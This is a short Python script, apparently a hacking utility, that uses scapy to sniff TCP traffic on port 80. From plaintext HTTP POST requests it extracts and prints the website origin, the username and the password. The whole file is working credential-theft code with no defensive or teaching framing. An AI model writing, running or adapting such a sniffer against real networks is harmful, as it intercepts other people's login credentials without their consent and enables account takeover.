from scapy.all import *
import netifaces as ni
import os
import re

def sniffcreds():
    print("[INFO] Looking for login credentials")
    sniff(prn=getcreds, filter="tcp")
	
def getcreds(pkt):
    method=b'POST'
    if pkt.dport == 80:
        if pkt.haslayer(Raw):
            r = pkt[Raw].load
            if method in r:
                try:
                    print("="*50)
                    r = r.decode('UTF-8')
                
                    w = 'Origin:' + '(.+?)' + '\n'
                    web = re.search(w, r).group(1)
                    print("Website is:", web)
                    
                    #Extract username in between uid= and &
                    user = '=' + '(.+?)' + '&'
                    uname = re.search(user, r).group(1)
                    print("Username is:", uname)
                    
                    #throw away everything before of &
                    k="&"
                    res = re.split(k, r, 1)[-1]
                    
                    if "&" in res:
                        pw = '=' + '(.+?)' + '&'
                        pwd = re.search(pw, res).group(1)
                        print("Password is:", pwd)
                    else:
                        pwd = re.split("=", res)
                        print("Password is:", pwd[1])
                    print("="*50)
                except UnicodeDecodeError as e:
                    print(e)
					
if __name__ == "__main__":
	sniffcreds()

